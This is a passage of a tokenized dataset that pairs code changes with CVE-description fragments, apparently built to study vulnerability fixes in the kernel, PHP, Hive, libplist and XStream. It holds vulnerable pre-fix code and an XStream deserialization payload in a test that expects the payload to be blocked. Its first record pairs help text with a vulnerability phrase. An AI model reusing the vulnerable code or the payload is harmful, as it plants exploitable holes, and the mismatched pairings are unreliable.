"\u043e\u043b", "\u0443\u0447", "\u0435\u043d", "\u0438\u044f", "\u0431", "\u043e\u043b", "\u0435\u0435", "\u043f", "\u043e\u0434", "\u0440\u043e", "\u0431\u043d", "\u043e\u0439", "\u0438", "\u043d\u0444", "\u043e\u0440", "\u043c\u0430", "\u0446\u0438", "\u0438", "\u043e", "\u0442", "\u043e\u043c", "\u043a", "\u0430\u043a", "\u043f", "\u043e\u043b", "\u0443\u0447", "\u0438\u0442", "\u044c", "\u0437", "\u043d\u0430", "\u0447\u0435", "\u043d\u0438", "\u044f", "\u043f", "\u043e", "\u043e", "\u0441\u044f", "\u043c.", "<", "/", "div", ">", "<", "div", ">", "Yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rmalar", "&", "#", "305", ";", "n", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "t", "&", "#", "305", ";", "r", "&", "#", "305", ";", "laca", "&", "#", "287", ";", "&#", "305", ";", "JDK", "(", "lar", "&", "#", "305", ";", ")", "belirleyiniz", ".", "E", "&", "#", "287", ";", "er", ",", "herhangi", "biri", "se", "&", "#", "231", ";", "ilmez", "ise", "varsay", "&", "#", "305", ";", "lan", "JDK", "kullan", "&", "#", "305", ";", "lacakt", "&", "#", "305", ";", "r", "(", "<", "tt", ">", "JAVA_HOME", "<", "/", "tt", ">", "'", "un", "olmad", "&", "#", "305", ";", "&#", "287", ";", "&#", "305", ";", ",", "ve", "<", "tt", ">", "java", "<", "/", "tt", ">", "komutunun", "<", "tt", ">", "PATH", "<", "/", "tt", ">", "i", "&", "#", "231", ";", "erisinde", "oldu", "&", "#", "287", ";", "u", "varsay", "&", "#", "305", ";", "lmaktad", "&", "#", "305", ";", "r", ".", ").", "E", "&", "#", "287", ";", "er", "birden", "fazla", "JDK", "se", "&", "#", "231", ";", "ilirse", ",", "konfig", "&", "#", "252", ";", "rasyon", "matrisi", "belirtilen", "t", "&", "#", "252", ";", "m", "JDK", "'", "lar", "&", "#", "305", ";", "i", "&", "#", "231", ";", "erecektir", ".", "<", "br", ">", "E", "&", "#", "287", ";", "er", "yap", "&", "#", "305", ";", "lmak", "istenen", "testin", ",", "farkl", "&", "#", "305", ";", "JDK", "'", "lar", "&", "#", "252", ";", "zerinde", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "t", "&", "#", "305", ";", "r", "&", "#", "305", ";", "lmas", "&", "#", "305", ";", "isteniyorsa", ",", "birden", "fazla", "de", "&", "#", "287", ";", "er", "se", "&", "#", "231", ";", "mek", "kullan", "&", "#", "305", ";", "&#", "351", ";", "l", "&", "#", "305", ";", "olacakt", "&", "#", "305", ";", "r", ",", "<", "br", ">", "Yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rma", "esnas", "&", "#", "305", ";", "nda", ",", "se", "&", "#", "231", ";", "ilen", "JDK", "de", "&", "#", "287", ";", "eri", "\"", "jdK", "\"", "ekseni", "olarak", "g", "&", "#", "246", ";", "r", "&", "#", "252", ";", "lecektir", ".", "Eksen", "de", "&", "#", "287", ";", "erlerine", "nas", "&", "#", "305", ";", "l", "eri", "&", "#", "351", ";", "ilece", "&", "#", "287", ";", "ine", "dair", "daha", "fazla", "bilgi", "i", "&", "#", "231", ";", "in", ",", "a", "&", "#", "351", ";", "a", "&", "#", "287", ";", "&#", "305", ";", "da", "\"", "eksenler", "\"", "ile", "ilgili", "yard", "&", "#", "305", ";", "m", "k", "&", "#", "305", ";", "sm", "&", "#", "305", ";", "na", "bak", "&", "#", "305", ";", "n", "&", "#", "305", ";", "z", ".", "<", "/", "div", ">", "<", "div", ">", "\u6307", "\u5b9a\u8981", "\u7528\u4f86", "\u57f7\u884c", "\u5efa\u7f6e", "\u7684", "JDK", "\u3002", "\u5982\u679c", "\u6c92\u6709", "\u9078\u53d6", "\u4efb\u4f55", "\u9805\u76ee", "\uff0c\u6703", "\u4f7f\u7528", "\u9810\u8a2d", "JDK", "(", "\u5982\u679c", "\u6c92\u6709", "\u660e\u78ba", "\u7684", "<", "code", ">", "JAVA_HOME", "<", "/", "code", ">", "\u8a2d", "\u5b9a\uff0c", "\u6703\u4f7f", "\u7528\u5728", "<", "code", ">", "PATH", "<", "/", "code", ">", "\u8def", "\u5f91\u88e1", "\u7684", "<", "code", ">", "java", "<", "/", "code", ">", "\u6307", "\u4ee4)", "\u3002", "\u5982", "\u679c\u9078", "\u4e86\u8d85", "\u904e\u4e00", "\u500b", "JDK", "\uff0c", "\u8a2d\u5b9a", "\u9663\u77e9", "\u6703\u5c07", "\u5b83\u5011", "\u5168\u90e8", "\u7d0d\u9032", "\u4f86\u3002", "<", "br", ">", "\u5982", "\u679c\u60a8", "\u7684\u4f5c", "\u696d\u6703", "\u57f7\u884c", "\u6e2c\u8a66", "\uff0c\u800c", "\u4e14\u9700", "\u8981\u5728", "\u4e0d\u540c", "\u7248\u672c", "\u7684", "JDK", "\u4e0a", "\u90fd\u8dd1", "\u904e\u4e00", "\u6b21\uff0c", "\u60a8\u5c31", "\u53ef\u4ee5", "\u5c07\u9019", "\u4e9b", "JDK", "\u90fd", "\u9078\u9032", "\u4f86\u3002", "<", "br", ">", "\u5efa", "\u7f6e\u6642", "\uff0c\u9078", "\u53d6\u7684", "JDK", "\u503c", "\u6703\u5728", "\"", "jdk", "\"", "\u8ef8", "\u4e0a\u51fa", "\u73fe\u3002", "\u8acb", "\u53c3\u8003", "\u4e0b\u65b9", "\u7684\u300c", "\u8ef8\u7dda", "\u300d\uff0c", "\u4e86\u89e3", "\u5982\u4f55", "\u5b58\u53d6", "\u5ea7\u6a19", "\u503c\u7684", "\u76f8\u95dc", "\u8cc7\u6599", "\u3002", "<", "/", "div", ">"], "docstring_tokens": ["via", "unspecified", "vectors", "."]}
{"contents": ["empty"], "code_tokens": ["/", "/", "Note", ":", "If", "the", "stream", "in", "not", "in", "this", "Map", "then", "the", "/", "/", "requested", "write", "has", "been", "fully", "allocated", "if", "(", "value", "!", "=", "null", "&", "&", "value", "[", "1", "]", "=", "=", "0", ")", "{</s>if", "(", "value", "[", "1", "]", "=", "=", "0", ")", "{"], "docstring_tokens": ["failing", "to", "send", "WINDOW_UPDATE", "messages"]}
{"contents": ["empty"], "code_tokens": ["private", "transient", "boolean", "securityInitialized", ";", "private", "transient", "boolean", "securityWarningGiven", ";", "securityInitialized", "=", "false", ";", "if", "(", "!", "xstream", ".", "securityInitialized", ")", "{", "if", "(", "!", "securityInitialized", "&", "&", "!", "securityWarningGiven", ")", "{", "securityWarningGiven", "=", "true", ";", "if", "(", "permission", "=", "=", "AnyTypePermission", ".", "ANY", ")", "securityInitialized", "=", "false", ";", "else", "if", "(", "permission", "=", "=", "NoTypePermission", ".", "NONE", ")", "{", "securityInitialized", "=", "true", ";", "}", "securityInitialized", "=", "true", ";", "private", "Object", "readResolve", "(", ")", "{", "securityWarningGiven", "=", "true", ";", "return", "this", ";", "}", "|", "|", "(", "!", "securityInitialized", "*", "Copyright", "(", "C", ")", "2013", ",", "2014", ",", "2017", ",", "2018", "XStream", "Committers", ".", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "XStream", ";", "public", "void", "testCannotInjectEventHandlerWithUnconfiguredSecurityFramework", "(", ")", "{", "xstream", "=", "new", "XStream", "(", "createDriver", "(", "))", ";", "xstream", ".", "alias", "(", "\"", "runnable", "\"", ",", "Runnable", ".", "class", ")", ";", "final", "String", "xml", "=", "\"", "\"", "+", "\"", "<", "string", "class", "=", "'", "runnable", "-", "array", "'", ">\\", "n", "\"", "+", "\"", "<", "dynamic", "-", "proxy", ">", "\\", "n", "\"", "+", "\"", "<", "interface", ">", "java", ".", "lang", ".", "Runnable", "<", "/", "interface", ">", "\\", "n", "\"", "+", "\"", "<", "handler", "class", "=", "'", "java", ".", "beans", ".", "EventHandler", "'", ">\\", "n", "\"", "+", "\"", "<", "target", "class", "=", "'", "com", ".", "thoughtworks", ".", "acceptance", ".", "SecurityVulnerabilityTest", "$", "Exec", "'", "/>", "\\", "n", "\"", "+", "\"", "<", "action", ">", "exec", "<", "/", "action", ">", "\\", "n", "\"", "+", "\"", "<", "/", "handler", ">", "\\", "n", "\"", "+", "\"", "<", "/", "dynamic", "-", "proxy", ">", "\\", "n", "\"", "+", "\"", "</", "string", ">", "\";", "try", "{", "xstream", ".", "fromXML", "(", "xml", ")", ";", "fail", "(", "\"", "Thrown", "\"", "+", "XStreamException", ".", "class", ".", "getName", "(", ")", "+", "\"", "expected", "\"", ");", "}", "catch", "(", "final", "XStreamException", "e", ")", "{", "assertTrue", "(", "e", ".", "getMessage", "(", ").", "contains", "(", "EventHandler", ".", "class", ".", "getName", "(", "))", ");", "}", "assertEquals", "(", "0", ",", "BUFFER", ".", "length", "(", "))", ";", "}", "+", "\"", "<", "string", "class", "=", "'", "runnable", "-", "array", "'", ">\\", "n", "\"</s>private", "transient", "boolean", "insecureWarning", ";", "insecureWarning", "=", "true", ";", "if", "(", "xstream", ".", "insecureWarning", ")", "{", "if", "(", "insecureWarning", ")", "{", "insecureWarning", "=", "false", ";", "insecureWarning", "&", "=", "permission", "!", "=", "NoTypePermission", ".", "NONE", ";", "|", "|", "(", "insecureWarning", "*", "Copyright", "(", "C", ")", "2013", ",", "2014", ",", "2017", "XStream", "Committers", "."], "docstring_tokens": ["sending", "a", "specially-crafted", "data"]}
{"contents": ["empty"], "code_tokens": ["bool", "do_vnet", "=", "false", ";", "if", "(", "po", "-", ">", "has_vnet_hdr", ")", "{", "do_vnet", "=", "true", ";", "}", "if", "(", "(", "int", ")", "snaplen", "<", "0", ")", "{", "do_vnet", "=", "false", ";", "}", "do_vnet", "=", "false", ";", "if", "(", "do_vnet", ")", "{</s>if", "(", "po", "-", ">", "has_vnet_hdr", ")", "if", "(", "(", "int", ")", "snaplen", "<", "0", ")", "if", "(", "po", "-", ">", "has_vnet_hdr", ")", "{"], "docstring_tokens": ["writing", "up", "to", "10", "bytes", "to", "a", "kernel", "memory", "outside", "of", "a", "kernel", "buffer", "[Reference", "]"]}
{"contents": ["empty"], "code_tokens": ["cpu", "=", "cpumask_first", "(", "mask", ")", ";</s>"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["import", "com", ".", "google", ".", "common", ".", "collect", ".", "Sets", ";", "Set", "<", "ReadEntity", ">", "additionalInputs", "=", "new", "HashSet", "<", "ReadEntity", ">", "()", ";", "for", "(", "Entity", "e", ":", "sem", ".", "getInputs", "(", "))", "{", "if", "(", "e", ".", "getType", "(", ")", "=", "=", "Entity", ".", "Type", ".", "PARTITION", ")", "{", "additionalInputs", ".", "add", "(", "new", "ReadEntity", "(", "e", ".", "getTable", "(", "))", ");", "}", "}", "Set", "<", "WriteEntity", ">", "additionalOutputs", "=", "new", "HashSet", "<", "WriteEntity", ">", "()", ";", "for", "(", "Entity", "e", ":", "sem", ".", "getOutputs", "(", "))", "{", "if", "(", "e", ".", "getType", "(", ")", "=", "=", "Entity", ".", "Type", ".", "PARTITION", ")", "{", "additionalOutputs", ".", "add", "(", "new", "WriteEntity", "(", "e", ".", "getTable", "(", "),", "WriteEntity", ".", "WriteType", ".", "DDL_NO_LOCK", ")", ");", "}", "}", "Set", "<", "ReadEntity", ">", "inputs", "=", "Sets", ".", "union", "(", "sem", ".", "getInputs", "(", "),", "additionalInputs", ")", ";", "Set", "<", "WriteEntity", ">", "outputs", "=", "Sets", ".", "union", "(", "sem", ".", "getOutputs", "(", "),", "additionalOutputs", ")", ";", "private", "static", "void", "doAuthorizationV2", "(", "SessionState", "ss", ",", "HiveOperation", "op", ",", "Set", "<", "ReadEntity", ">", "inputs", ",", "Set", "<", "WriteEntity", ">", "outputs", ",", "String", "command", ",", "Map", "<", "String", ",", "List", "<", "String", ">", ">", "tab2cols", ",", "Set", "<", "?", "extends", "Entity", ">", "privObjects", ",", "Map", "<", "String", ",", "List", "<", "String", ">", ">", "tableName2Cols", ")", "{</s>HashSet", "<", "ReadEntity", ">", "inputs", "=", "sem", ".", "getInputs", "(", ");", "HashSet", "<", "WriteEntity", ">", "outputs", "=", "sem", ".", "getOutputs", "(", ");", "private", "static", "void", "doAuthorizationV2", "(", "SessionState", "ss", ",", "HiveOperation", "op", ",", "HashSet", "<", "ReadEntity", ">", "inputs", ",", "HashSet", "<", "WriteEntity", ">", "outputs", ",", "String", "command", ",", "Map", "<", "String", ",", "List", "<", "String", ">", ">", "tab2cols", ",", "HashSet", "<", "?", "extends", "Entity", ">", "privObjects", ",", "Map", "<", "String", ",", "List", "<", "String", ">", ">", "tableName2Cols", ")", "{"], "docstring_tokens": ["the", "partition-level", "privilege", "is", "not", "checked", "by", "the", "authorization", "framework"]}
{"contents": ["empty"], "code_tokens": ["char", "*", "newpath", ";", "newpath", "=", "emalloc", "(", "strlen", "(", "path", ")", "+", "newpath_len", "+", "1", ")", ";", "newpath", "=", "emalloc", "(", "strlen", "(", "path", ")", "+", "2", ")", ";", "efree", "(", "newpath", ")", ";", "efree", "(", "newpath", ")", ";", "efree", "(", "newpath", ")", ";", "newpath", "[", "newpath_len", "]", "=", "'", "\\", "0", "'", ";", "return", "erealloc", "(", "newpath", ",", "newpath_len", "+", "1", ")", ";</s>char", "newpath", "[", "MAXPATHLEN", "]", ";", "return", "estrndup", "(", "newpath", ",", "newpath_len", ")", ";"], "docstring_tokens": ["sending", "an", "overly", "long", "argument"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "up", "-", ">", "replay_window", ">", "up", "-", ">", "bmp_len", "*", "sizeof", "(", "__u32", ")", "*", "8", ")", "return", "-", "EINVAL", ";</s>"], "docstring_tokens": ["using", "user", "namespaces"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "!", "s", "-", ">", "not_found", "&", "&", "here", "-", ">", "e_value_size", "&", "&", "here", "-", ">", "e_value_offs", ")", "{</s>if", "(", "!", "s", "-", ">", "not_found", "&", "&", "here", "-", ">", "e_value_offs", ")", "{"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["static", "sctp_disposition_t", "sctp_sf_tabort_8_4_8", "(", "const", "struct", "sctp_endpoint", "*", "ep", ",", "const", "struct", "sctp_association", "*", "asoc", ",", "const", "sctp_subtype_t", "type", ",", "void", "*", "arg", ",", "sctp_cmd_seq_t", "*", "commands", ")", ";", "const", "struct", "sctp_endpoint", "*", "ep", ",", "static", "sctp_disposition_t", "sctp_sf_violation_chunk", "(", "const", "struct", "sctp_endpoint", "*", "ep", ",", "const", "struct", "sctp_association", "*", "asoc", ",", "const", "sctp_subtype_t", "type", ",", "void", "*", "arg", ",", "sctp_cmd_seq_t", "*", "commands", ")", ";", "if", "(", "!", "sctp_vtag_verify_either", "(", "chunk", ",", "asoc", ")", ")", "return", "sctp_sf_pdiscard", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "return", "sctp_sf_violation_chunk", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "/", "*", "Make", "sure", "that", "the", "SHUTDOWN_COMPLETE", "chunk", "has", "a", "valid", "length", ".", "*", "/", "if", "(", "!", "sctp_chunk_length_valid", "(", "chunk", ",", "sizeof", "(", "sctp_chunkhdr_t", ")", "))", "return", "sctp_sf_violation_chunklen", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "return", "sctp_sf_violation_chunk", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "/", "*", "Make", "sure", "that", "the", "INIT", "-", "ACK", "chunk", "has", "a", "valid", "length", "*", "/", "if", "(", "!", "sctp_chunk_length_valid", "(", "chunk", ",", "sizeof", "(", "sctp_initack_chunk_t", ")", "))", "return", "sctp_sf_violation_chunklen", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "return", "sctp_sf_tabort_8_4_8", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "/", "*", "Make", "sure", "that", "the", "chunk", "has", "a", "valid", "length", "*", "/", "if", "(", "!", "sctp_chunk_length_valid", "(", "chunk", ",", "sizeof", "(", "sctp_chunkhdr_t", ")", "))", "return", "sctp_sf_violation_chunklen", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "static", "sctp_disposition_t", "sctp_sf_tabort_8_4_8", "(", "const", "struct", "sctp_endpoint", "*", "ep", ",", "/", "*", "Report", "violation", "if", "the", "chunk", "is", "less", "then", "minimal", "*", "/", "return", "sctp_sf_violation_chunklen", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "/", "*", "Now", "that", "we", "know", "we", "at", "least", "have", "a", "chunk", "header", ",", "*", "do", "things", "that", "are", "type", "appropriate", ".", "*", "/", "/", "*", "Report", "violation", "if", "chunk", "len", "overflows", "*", "/", "ch_end", "=", "(", "(", "__u8", "*", ")", "ch", ")", "+", "WORD_ROUND", "(", "ntohs", "(", "ch", "-", ">", "length", ")", ");", "if", "(", "ch_end", ">", "skb_tail_pointer", "(", "skb", ")", ")", "return", "sctp_sf_violation_chunklen", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "struct", "sctp_chunk", "*", "chunk", "=", "arg", ";", "/", "*", "Make", "sure", "that", "the", "SHUTDOWN_ACK", "chunk", "has", "a", "valid", "length", ".", "*", "/", "if", "(", "!", "sctp_chunk_length_valid", "(", "chunk", ",", "sizeof", "(", "sctp_chunkhdr_t", ")", "))", "return", "sctp_sf_violation_chunklen", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "struct", "sctp_chunk", "*", "chunk", "=", "arg", ";", "/", "*", "Make", "sure", "that", "the", "chunk", "has", "a", "valid", "length", ".", "*", "Since", "we", "don", "'", "t", "know", "the", "chunk", "type", ",", "we", "use", "a", "general", "*", "chunkhdr", "structure", "to", "make", "a", "comparison", ".", "*", "/", "if", "(", "!", "sctp_chunk_length_valid", "(", "chunk", ",", "sizeof", "(", "sctp_chunkhdr_t", ")", "))", "return", "sctp_sf_violation_chunklen", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "struct", "sctp_chunk", "*", "chunk", "=", "arg", ";", "/", "*", "Make", "sure", "that", "the", "chunk", "has", "a", "valid", "length", ".", "*", "/", "if", "(", "!", "sctp_chunk_length_valid", "(", "chunk", ",", "sizeof", "(", "sctp_chunkhdr_t", ")", "))", "return", "sctp_sf_violation_chunklen", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "const", "struct", "sctp_endpoint", "*", "ep", ",", "struct", "sctp_packet", "*", "packet", "=", "NULL", ";", "if", "(", "asoc", ")", "{", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_REPLY", ",", "SCTP_CHUNK", "(", "abort", ")", ");", "SCTP_INC_STATS", "(", "SCTP_MIB_OUTCTRLCHUNKS", ")", ";", "if", "(", "asoc", "-", ">", "state", "<", "=", "SCTP_STATE_COOKIE_ECHOED", ")", "{", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_TIMER_STOP", ",", "SCTP_TO", "(", "SCTP_EVENT_TIMEOUT_T1_INIT", ")", ");", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_SET_SK_ERR", ",", "SCTP_ERROR", "(", "ECONNREFUSED", ")", ");", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_INIT_FAILED", ",", "SCTP_PERR", "(", "SCTP_ERROR_PROTO_VIOLATION", ")", ");", "}", "else", "{", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_SET_SK_ERR", ",", "SCTP_ERROR", "(", "ECONNABORTED", ")", ");", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_ASSOC_FAILED", ",", "SCTP_PERR", "(", "SCTP_ERROR_PROTO_VIOLATION", ")", ");", "SCTP_DEC_STATS", "(", "SCTP_MIB_CURRESTAB", ")", ";", "}", "packet", "=", "sctp_ootb_pkt_new", "(", "asoc", ",", "chunk", ")", ";", "if", "(", "!", "packet", ")", "goto", "nomem_pkt", ";", "if", "(", "sctp_test_T_bit", "(", "abort", ")", ")", "packet", "-", ">", "vtag", "=", "ntohl", "(", "chunk", "-", ">", "sctp_hdr", "-", ">", "vtag", ")", ";", "abort", "-", ">", "skb", "-", ">", "sk", "=", "ep", "-", ">", "base", ".", "sk", ";", "sctp_packet_append_chunk", "(", "packet", ",", "abort", ")", ";", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_SEND_PKT", ",", "SCTP_PACKET", "(", "packet", ")", ");", "SCTP_INC_STATS", "(", "SCTP_MIB_OUTCTRLCHUNKS", ")", ";", "sctp_sf_pdiscard", "(", "ep", ",", "asoc", ",", "SCTP_ST_CHUNK", "(", "0", ")", ",", "arg", ",", "commands", ")", ";", "nomem_pkt", ":", "sctp_chunk_free", "(", "abort", ")", ";", "return", "sctp_sf_abort_violation", "(", "ep", ",", "asoc", ",", "arg", ",", "commands", ",", "err_str", ",", "return", "sctp_sf_abort_violation", "(", "ep", ",", "asoc", ",", "arg", ",", "commands", ",", "err_str", ",", "/", "*", "Handle", "protocol", "violation", "of", "an", "invalid", "chunk", "bundling", ".", "For", "example", ",", "*", "when", "we", "have", "an", "association", "and", "we", "recieve", "bundled", "INIT", "-", "ACK", ",", "or", "*", "SHUDOWN", "-", "COMPLETE", ",", "our", "peer", "is", "clearly", "violationg", "the", "\"", "MUST", "NOT", "bundle", "\"", "*", "statement", "from", "the", "specs", ".", "Additinally", ",", "there", "might", "be", "an", "attacker", "*", "on", "the", "path", "and", "we", "may", "not", "want", "to", "continue", "this", "communication", ".", "*", "/", "static", "sctp_disposition_t", "sctp_sf_violation_chunk", "(", "const", "struct", "sctp_endpoint", "*", "ep", ",", "const", "struct", "sctp_association", "*", "asoc", ",", "const", "sctp_subtype_t", "type", ",", "void", "*", "arg", ",", "sctp_cmd_seq_t", "*", "commands", ")", "{", "char", "err_str", "[", "]=", "\"", "The", "following", "chunk", "violates", "protocol", ":", "\";", "if", "(", "!", "asoc", ")", "return", "sctp_sf_violation", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "return", "sctp_sf_abort_violation", "(", "ep", ",", "asoc", ",", "arg", ",", "commands", ",", "err_str", ",", "sizeof", "(", "err_str", ")", ");", "}", "TYPE_SCTP_FUNC", "(", "sctp_sf_ootb", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_ootb", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_ootb", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_ootb", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_ootb", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_ootb", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_ootb", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_ootb", ")", ",</s>sctp_state_fn_t", "sctp_sf_tabort_8_4_8", ";", "return", "SCTP_DISPOSITION_VIOLATION", ";", "if", "(", "!", "sctp_vtag_verify_either", "(", "chunk", ",", "asoc", ")", ")", "return", "sctp_sf_pdiscard", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "/", "*", "Make", "sure", "that", "the", "INIT", "-", "ACK", "chunk", "has", "a", "valid", "length", "*", "/", "if", "(", "!", "sctp_chunk_length_valid", "(", "chunk", ",", "sizeof", "(", "sctp_initack_chunk_t", ")", "))", "return", "sctp_sf_violation_chunklen", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "return", "SCTP_DISPOSITION_VIOLATION", ";", "return", "sctp_sf_ootb", "(", "ep", ",", "asoc", ",", "type", ",", "arg", ",", "commands", ")", ";", "sctp_disposition_t", "sctp_sf_tabort_8_4_8", "(", "const", "struct", "sctp_endpoint", "*", "ep", ",", "/", "*", "Break", "out", "if", "chunk", "length", "is", "less", "then", "minimal", ".", "*", "/", "break", ";", "ch_end", "=", "(", "(", "__u8", "*", ")", "ch", ")", "+", "WORD_ROUND", "(", "ntohs", "(", "ch", "-", ">", "length", ")", ");", "if", "(", "ch_end", ">", "skb_tail_pointer", "(", "skb", ")", ")", "break", ";", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_REPLY", ",", "SCTP_CHUNK", "(", "abort", ")", ");", "SCTP_INC_STATS", "(", "SCTP_MIB_OUTCTRLCHUNKS", ")", ";", "if", "(", "asoc", "-", ">", "state", "<", "=", "SCTP_STATE_COOKIE_ECHOED", ")", "{", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_TIMER_STOP", ",", "SCTP_TO", "(", "SCTP_EVENT_TIMEOUT_T1_INIT", ")", ");", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_SET_SK_ERR", ",", "SCTP_ERROR", "(", "ECONNREFUSED", ")", ");", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_INIT_FAILED", ",", "SCTP_PERR", "(", "SCTP_ERROR_PROTO_VIOLATION", ")", ");", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_SET_SK_ERR", ",", "SCTP_ERROR", "(", "ECONNABORTED", ")", ");", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_ASSOC_FAILED", ",", "SCTP_PERR", "(", "SCTP_ERROR_PROTO_VIOLATION", ")", ");", "SCTP_DEC_STATS", "(", "SCTP_MIB_CURRESTAB", ")", ";", "sctp_add_cmd_sf", "(", "commands", ",", "SCTP_CMD_DISCARD_PACKET", ",", "SCTP_NULL", "(", "))", ";", "return", "sctp_sf_abort_violation", "(", "asoc", ",", "arg", ",", "commands", ",", "err_str", ",", "return", "sctp_sf_abort_violation", "(", "asoc", ",", "arg", ",", "commands", ",", "err_str", ",", "TYPE_SCTP_FUNC", "(", "sctp_sf_tabort_8_4_8", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_tabort_8_4_8", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_tabort_8_4_8", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_tabort_8_4_8", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_tabort_8_4_8", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_tabort_8_4_8", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_tabort_8_4_8", ")", ",", "\\", "TYPE_SCTP_FUNC", "(", "sctp_sf_tabort_8_4_8", ")", ","], "docstring_tokens": ["via", "(1", ")", "an", "Out", "Of", "The", "Blue", "(OOTB", ")", "chunk", "or", "(2", ")", "a", "chunk", "of", "zero", "length", "."]}
{"contents": ["empty"], "code_tokens": ["if", "(", "plist_get_data", "(", "key", ")", "->", "type", "!", "=", "PLIST_STRING", ")", "{", "fprintf", "(", "stderr", ",", "\"", "ERROR", ":", "Malformed", "binary", "plist", "dict", ",", "invalid", "node", "type", "for", "key", "!", "\\", "n", "\"", ");", "plist_free", "(", "node", ")", ";", "return", "NULL", ";", "}</s>"], "docstring_tokens": ["via", "vectors", "involving", "an", "integer", "node", "that", "is", "treated", "as", "a", "PLIST_KEY", "and", "then", "triggers", "an", "invalid", "free", "."]}
{"contents": ["empty"], "code_tokens": ["return", "pmd_flags", "(", "pte", ")", "&", "_PAGE_PSE", ";", "/", "*", "*", "Checking", "for", "_PAGE_PSE", "is", "needed", "too", "because", "*", "split_huge_page", "will", "temporarily", "clear", "the", "present", "bit", "(", "but", "*", "the", "_PAGE_PSE", "flag", "will", "remain", "set", "at", "all", "times", "while", "the", "*", "_PAGE_PRESENT", "bit", "is", "clear", ")", ".", "*", "/", "return", "pmd_flags", "(", "pmd", ")", "&", "(", "_PAGE_PRESENT", "|", "_PAGE_PROTNONE", "|", "_PAGE_PSE", ")", ";</s>return", "(", "pmd_flags", "(", "pte", ")", "&", "(", "_PAGE_PSE", "|", "_PAGE_PRESENT", ")", ")", "=", "=", "(", "_PAGE_PSE", "|", "_PAGE_PRESENT", ")", ";", "return", "pmd_flags", "(", "pmd", ")", "&", "_PAGE_PRESENT", ";"], "docstring_tokens": ["via", "a", "crafted", "application", "."]}
{"contents": ["empty"], "code_tokens": ["struct", "xfrm_policy_walk", "*", "walk", "=", "(", "struct", "xfrm_policy_walk", "*", ")", "cb", "-", ">", "args", ";", "static", "int", "xfrm_dump_policy_start", "(", "struct", "netlink_callback", "*", "cb", ")", "{", "struct", "xfrm_policy_walk", "*", "walk", "=", "(", "struct", "xfrm_policy_walk", "*", ")", "cb", "-", ">", "args", ";", "BUILD_BUG_ON", "(", "sizeof", "(", "*", "walk", ")", ">", "sizeof", "(", "cb", "-", ">", "args", ")", ");", "xfrm_policy_walk_init", "(", "walk", ",", "XFRM_POLICY_TYPE_ANY", ")", ";", "return", "0", ";", "}", "struct", "xfrm_policy_walk", "*", "walk", "=", "(", "struct", "xfrm_policy_walk", "*", ")", "cb", "-", ">", "args", ";", "int", "(", "*", "start", ")", "(", "struct", "netlink_callback", "*", ");", ".", "start", "=", "xfrm_dump_policy_start", ",", ".", "start", "=", "link", "-", ">", "start", ",</s>struct", "xfrm_policy_walk", "*", "walk", "=", "(", "struct", "xfrm_policy_walk", "*", ")", "&", "cb", "-", ">", "args", "[", "1", "]", ";", "struct", "xfrm_policy_walk", "*", "walk", "=", "(", "struct", "xfrm_policy_walk", "*", ")", "&", "cb", "-", ">", "args", "[", "1", "]", ";", "BUILD_BUG_ON", "(", "sizeof", "(", "struct", "xfrm_policy_walk", 